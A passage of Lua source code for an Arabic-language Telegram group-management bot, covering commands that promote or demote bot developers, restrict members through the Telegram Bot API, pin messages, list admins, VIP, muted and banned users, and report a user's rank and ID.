botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم رفعه « مطور رتبه ثالثه » *', 1, 'md')
end end end end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,addadmin_by_reply)
end
-----------------------------------------------------------------------------------------------
if text:match("^رفع مطور رتبه ثالثه @(.*)$") then
local ap = {string.match(text, "^(رفع مطور رتبه ثالثه) @(.*)$")}
function addadmin_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷|| has been Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ العضو « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم رفعه « مطور رتبه ثالثه » '
end
botx1:sadd(BOT..'bot:admins:', result.id_)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],addadmin_by_username)
end
----------------------------------------bot-------------------------------------------------------
if text:match("^رفع مطور رتبه ثالثه (%d+)$") then
local ap = {string.match(text, "^(رفع مطور رتبه ثالثه) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم رفعه « مطور رتبه ثالثه » *', 1, 'md')
end
botx1:sadd(BOT..'bot:admins:', ap[2])
end
end
----------------------------------------bot-------------------------------------------------------
if msg.reply_to_message_id_ ~= 0 then
if text:match("^تنزيل مطور رتبه ثالثه$") then
function deadmin_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
local hash = 'bot:admins:'
if not botx1:sismember(BOT..hash, result.sender_user_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * لم يتم رفعه « مطور » سابقا *', 1, 'md')
end
else
botx1:srem(BOT..hash, result.sender_user_id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| removed from Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المطور الثالث* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم تنزيله « عضو » بنجاح *', 1, 'md')
end
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,deadmin_by_reply)
end
end
-------------------------------------------bot----------------------------------------------------
if text:match("^تنزيل مطور رتبه ثالثه @(.*)$") then
local hash = 'bot:admins:'
local ap = {string.match(text, "^([Rr]emdev3) @(.*)$")}
function remadmin_by_username(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.id_)
local bot_res = user_info_
if user_info_ then
if result.id_ then
botx1:srem(BOT..hash, result.id_)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| removed from Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
else
texts = '👤╿❯ المطور الثالث « '..bot_res..' »\n💯┊❯ ايديه « '..result.id_..' »\n📌┊❯ بواسطه « '..renk_bot(msg)..' »\n☑️╽❯ تم تنزيله « عضو » '
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
texts = '*🚦|| Username is not correct ❎*'
else
texts = '*🎈|| المعرف غير صحيح ❎*'
end
end
end
botdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],remadmin_by_username)
end
-------------------------------------bot----------------------------------------------------------
if text:match("^تنزيل مطور رتبه ثالثه (%d+)$") then
local hash = 'bot:admins:'
local ap = {string.match(text, "^([Rr]emdev3) (%d+)$")}
local user_info_ = botx1:get(BOT..'user:Name' .. ap[2])
local bot_res = user_info_
if user_info_ then
botx1:srem(BOT..hash, ap[2])
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| removed from Dev therd bot ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *المطور الثالث* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..ap[2]..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ * تم تنزيله « عضو » بنجاح *', 1, 'md')
end
end
end
end
-----------
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then  
if text:match("^تقييد$") then  
function mute_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لا تستطيع تقييدي •', 1, 'md')
return false 
end 
if is_momod(result.sender_user_id_, msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *لا تستطيع تقييد* « ['..bot_res..'] »\n💯┊❯ *لانه تاج راسك •*', 1, 'md')
else 
HTTPS.request("https://api.telegram.org/bot"..tokenbot.."/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.."")
botx1:sadd(BOT..'tkeed:'..msg.chat_id_, result.sender_user_id_)
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم  « تقييده » بنجاح*', 1, 'md')
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
----------bot 
if msg.reply_to_message_id_ ~= 0 then  
if text:match("^الغاء تقييد$") then
function mute_by_reply(extra, result, success)
local user_info_ = botx1:get(BOT..'user:Name' .. result.sender_user_id_)
local bot_res = user_info_
if user_info_ then
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
botdx(msg.chat_id_, msg.id_, 1, 'هاذا البوت', 1, 'md')  
return false 
end 
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
botx1:srem(BOT..'tkeed:'..msg.chat_id_, result.sender_user_id_)
botdx(msg.chat_id_, msg.id_, 1, '👤╿❯ *العضو* « ['..bot_res..'] »\n💯┊❯ *ايديه* « *'..result.sender_user_id_..'* »\n📌┊❯ *بواسطه « '..renk_bot(msg)..' »*\n☑️╽❯ *تم  « الغاء تقييده » بنجاح*', 1, 'md')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end
end 
end
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^المقيدين$") then 
local hash =  'tkeed:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of baneed • \n\n"
else
text = "🚦⁞ قائمه المقيدين 🔽 \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~  ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~  ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of baeed is empty •"
else
text = "🚦⁞ لا يوجد المقيدين •"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
if text == 'مسح المقيدين' and is_momod(msg.sender_user_id_, msg.chat_id_) then     
local hash =  'tkeed:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..v.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
botx1:srem(BOT..'tkeed:'..msg.chat_id_, v)
end 
botdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم مسح المقيدين •', 1, 'md')
 end
-------------------------------------------bot----------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تثبيت$") then  
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,1)
botx1:set(BOT..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
botdx(msg.chat_id_, msg.id_, 1,'🚦⁞ تم تثبيت الرساله •', 1, 'md')
end
end
--------------------------------------bot---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Mm]odlist$") or text:match("^الادمنيه$") then
local hash =  'bot:momod:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of moderator 🔽 \n\n"
else
text = "🚦⁞ قائمه الادمنيه 🔽 \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of moderator is empty ☑️"
else
text = "🚦⁞ لا يوجد ادمنيه ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^[Mm]odalllist$") or text:match("^الادمنيه العامين$") then
local hash =  'bot:moall:'
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of moderator all🔽 \n\n"
else
text = "🚦⁞ قائمه الادمنيه العامين 🔽 \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of moderator all is empty ☑️"
else
text = "🚦⁞ لا يوجد ادمنيه عامين ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
--------------------------------bot-------------------------------------------
if text:match("^[Vv]iplist$") or text:match("^الاعضاء المميزين$") then
local hash =  'bot:vipmem:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of VIP Members 🔽 : \n\n"
else
text = "🚦⁞ قائمه الاعضاء المميزين 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of VIP members is empty ☑️"
else
text = "🚦⁞ لا يوجد مميزين ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
--------------------------------bot-------------------------------------------
if text:match("^[Dd]onkylist$") or text:match("^قائمه المطايه$") or text:match("^المطايه$") then
local hash =  'bot:donky:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of donky 🔽 : \n\n"
else
text = "🚦⁞ قائمه المطاية الكروب😹😔 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of donky is empty ☑️"
else
text = "🚦⁞ عجيب 😳😹 هذا الكروب كله اوادم ما بي مطايه 😹😔"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
--------------------------------bot-------------------------------------------
if text:match("^[Vv]ipalllist$") or text:match("^المميزين عام$") or text:match("^الاعضاء المميزين عام$") then
local hash =  'bot:vpall:'
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of VIP Members all🔽 : \n\n"
else
text = "🚦⁞ قائمه الاعضاء المميزين عام 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of VIP members all is empty ☑️"
else
text = "🚦⁞ لا يوجد مميزين عام ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
------------------------------------------bot-----------------------------------------------------
if text:match("^[Mm]utelist$") or text:match("^المكتومين$") then
local hash =  'bot:muted:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of muted users 🔽 : \n\n"
else
text = "🚦⁞ قائمه المكتومين 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of muted users is empty ☑️"
else
text = "🚦⁞ لا يوجد مكتومين ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
----------------------------------bot-------------------------------------------------------------
if text:match("^[Oo]wner$") or text:match("^[Oo]wnerlist$") or text:match("^المدير$") or text:match("^المدراء$") then
local hash =  'bot:owners:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ قائمه المدراء 🔽 : \n\n"
else
text = "🚦⁞ Owners list 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ Owner list is empty ☑️"
else
text = "🚦⁞ لا يوجد مدراء ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
---------------------------------bot------------
if text:match("^[Oo]wnerall$") or text:match("^[Oo]wneralllist$") or text:match("^المدراء العامين$") or text:match("^المدير العام$") then
local hash =  'bot:onall:'
local list = botx1:smembers(BOT..hash)
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ قائمه المدراء العامين 🔽 : \n\n"
else
text = "🚦⁞ Owners all list 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ Owner all list is empty ☑️"
else
text = "🚦⁞ لا يوجد مدراء عامين ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
----------------------------------------bot--------------
if text:match("^[mM]onsh$") or text:match("^[Mm]onshlist$") or text:match("^المنشئ$") or text:match("^المنشئين$") then
local hash =  'bot:monsh:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ قائمه المنشئين 🔽 : \n\n"
else
text = "🚦⁞ monsh list 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ Monsh list is empty ☑️"
else
text = "🚦⁞ لا يوجد المنشئين ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
----------------------------------------bot-------------------------------------------------------
if text:match("^[Bb]anlist$") or text:match("^المحظورين$") then
local hash =  'bot:banned:'..msg.chat_id_
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of banlist 📌 : \n\n"
else
text = "🚦⁞ قائمه المحظورين 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ list of banlist is empty ☑️"
else
text = "🚦⁞ لا يوجد محظورين ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
---------------------------------faedrr--------------------------------------------------------------
if is_sudo(msg) and (text:match("^[Ss]etsupport$") or text:match("^ضع دعم$")) then
if botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞  Please Send your *Support link* Or *Support Bot ID* now •", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, "️🚦⁞ ارسل لي رابط كروب الدعم •\n🚏⁞  او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله •", 1, "md")
end
botx1:setex(BOT.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if is_sudo(msg) and (text:match("^[Dd]elsupport$") or text:match("^حذف الدعم$")) then
if botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Support *Information* Deleted •", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ تم حذف معلومات الدعم •", 1, "md")
end
botx1:del(BOT.."bot:supports:link")
end
--------bot
if is_sudo(msg) then
if text:match("^[Bb]analllist$") or text:match("^قائمه العام$") then
local hash =  'bot:gban:'
local list = botx1:smembers(BOT..hash)
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ List of banlist 🔽 : \n\n"
else
text = "🚦⁞ قائمه الحظر العام 🔽 : \n\n"
end
for k,v in pairs(list) do
local user_info = botx1:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." ~ ⁞ @"..username.." ["..v.."]\n"
else
text = text..k.." ~ ⁞ "..v.."\n"
end
end
if #list == 0 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = "🚦⁞ list of banalllist is empty ☑️"
else
text = "🚦⁞ لا يوجد محظورين عام ☑️"
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
if text:match("^مطورين الرتبه الثالثه$") or text:match("^المطورين$") then
local hash =  'bot:admins:'
local list = botx1:smembers(BOT..hash)
text = "🚦⁞ مطورين الرتبه الثالثه 🔽 :\n\n"
for k, v in pairs(list) do
if botx1:get(BOT.."SudoNumberGp" .. v) then
gps = tonumber(botx1:get(BOT.."SudoNumberGp" .. v))
else
gps = 0
end
local user_info = botx1:get(BOT.."user:Name" .. v)
if user_info then
local username = user_info
text = text .. k .. "• [" .. username .. "] ~{" .. gps .. "}\n"
else
text = text .. k .. "• (" .. v .. ") ~{" .. gps .. "}\n"
end end
if #list == 0 then
text = "🚦⁞ لا يوجد مطورين بهذه الرتبه ☑️"
end
botdx(msg.chat_id_, msg.id_, 1, text, "md")
end end
------------------------------------bot-----------------------------------------------------------
if text:match("^[Gg]etid$") or text:match("^ايدي$") and msg.reply_to_message_id_ ~= 0 then
function id_by_reply(extra, result, success)
if botx1:get('lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ user id •  "..result.sender_user_id_, 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ ايدي العضو •  "..result.sender_user_id_, 1, 'md')
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,id_by_reply)
end
if text:match("^رتبته @(.*)$") then
local ap = {string.match(text, "^(رتبته) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'Sudo all'
elseif is_sudoid(result.id_) then
t = 'Sudo 2'
elseif is_admin(result.id_) then
t = 'sudo 3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_onall(result.id_) then
t = 'owner all'
elseif is_moall(result.id_) then
t = 'modod all'
elseif is_vpall(result.id_) then
t = 'vip all'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'Bot Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif is_sudoid(result.id_) then
t = 'مطور ثانوي'
elseif is_admin(result.id_) then
t = 'مطور فالرتبه الثالثه'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'منشئ الكروب'
elseif is_onall(result.id_) then
t = 'مدير عام'
elseif is_moall(result.id_) then
t = 'ادمن عام'
elseif is_vpall(result.id_) then
t = 'مميز عام'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي محمل طحين 😹😔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'مدير البوت'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'ادمن البوت'
elseif result.id_ == bot_id then
t = 'هذا انا البوت'
else
t = 'عضو فقط'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '💳⁞ rank ~ « '..t
else
text = '💳⁞ رتـبتـه ~ « '..t
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦• this channel or group •\n🎖• is not have rank •'
else
text = '🚦• هذه قناة او كروب •\n🎖• ليس له رتبه •'
end
end
end
if not result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦⁞ Username is not correct ☑️'
else
text = '🎖⁞ المعرف غير صحيح ☑️'
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
-----------------------------------bot------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ii]d @(.*)$") then
local ap = {string.match(text, "^([Ii]d) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'Sudo all'
elseif is_sudoid(result.id_) then
t = 'Sudo 2'
elseif is_admin(result.id_) then
t = 'sudo 3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_onall(result.id_) then
t = 'owner all'
elseif is_moall(result.id_) then
t = 'modod all'
elseif is_vpall(result.id_) then
t = 'vip all'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'Bot Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif is_sudoid(result.id_) then
t = 'مطور ثانوي'
elseif is_admin(result.id_) then
t = 'مطور فالرتبه الثالثه'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'منشئ الكروب'
elseif is_onall(result.id_) then
t = 'مدير عام'
elseif is_moall(result.id_) then
t = 'ادمن عام'
elseif is_vpall(result.id_) then
t = 'مميز عام'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي محمل طحين 😹😔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'مدير البوت'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'ادمن البوت'
elseif result.id_ == bot_id then
t = 'هذا انا البوت'
else
t = 'عضو فقط'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦⁞ user ~ « @'..ap[2]..' »\n🖇⁞ id ~ « `'..result.id_..'` »\n💳⁞ rank ~ « '..t
else
text = '🚦⁞ معـرفه ~ « @'..ap[2]..' »\n🖇⁞ ايـديـه ~ « `'..result.id_..'` »\n💳⁞ رتـبتـه ~ « '..t
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🚦⁞ Channel ~ « @'..ap[2]..' »\n🖇⁞ id ~ « {`'..result.id_..'`}'
else
text = '🚦⁞ القناة ~ « @'..ap[2]..' »\n🖇⁞ ايديها ~ « {`'..result.id_..'`}'
end
end
end
if not result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '🎖⁞ Username is not correct ☑️'
else
text = '🚦⁞ المعرف غير صحيح ☑️'
end
end
botdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
if text:match("^ايدي @(.*)$") then
local ap = {string.match(text, "^(ايدي) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'Chief'
elseif is_sudoid(result.id_) then
t = 'Sudo'
elseif is_admin(result.id_) then
t = 'sudo3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_onall(result.id_) then
t = 'owner all'
elseif is_moall(result.id_) then
t = 'modod all'
elseif is_vpall(result.id_) then
t = 'vip all'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'Group Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif is_sudoid(result.id_) then
t = 'مطور ثانوي'
elseif is_admin(result.id_) then
t = 'مطور فالرتبه الثالثه 🚩'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'منشئ الكروب'
elseif is_onall(result.id_) then
t = 'مدير عام'
elseif is_moall(result.id_) then
t = 'ادمن عام'
elseif is_vpall(result.id_) then
t = 'مميز عام'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي محمل طحين 😹😔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'مدير البوت'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'ادمن البوت'
elseif result.id_ == bot_id then
t = 'هذا انا البوت'
else
t = 'عضو فقط'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
text = '📌⁞ user ~ « @'..ap[2]..' »\n🖇⁞ id ~ « `'..result.id_..'` »\n💳⁞ rank ~ « '..t
else
